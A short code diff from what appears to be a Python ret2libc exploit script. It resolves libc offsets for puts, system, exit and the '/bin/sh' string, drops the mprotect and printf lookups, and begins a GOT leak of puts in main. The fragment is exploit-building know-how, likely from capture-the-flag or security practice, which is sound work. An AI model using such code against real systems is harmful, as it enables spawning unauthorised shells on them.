@@ -128,13 +128,11 @@ def getLibcSymbolOffsets(libcJson):
     putsOff = symbolJson['symbols'].get('puts')
     systemOff = symbolJson['symbols'].get('system')
     exitOff = symbolJson['symbols'].get('exit')
-    mprotectOff = symbolJson['symbols'].get('mprotect')
-    printfOff = symbolJson['symbols'].get('printf')
     bin_shOff = symbolJson['symbols'].get('str_bin_sh')
     print()
     log.info("Trying offsets for libc version: "+libId)
-    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotect: {mprotectOff}, printf: {printfOff}")
-    return putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff
+    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}")
+    return putsOff, systemOff, exitOff, bin_shOff
 
 def main():
     puts_addr = leak_via_puts(conn,port,gotPuts)
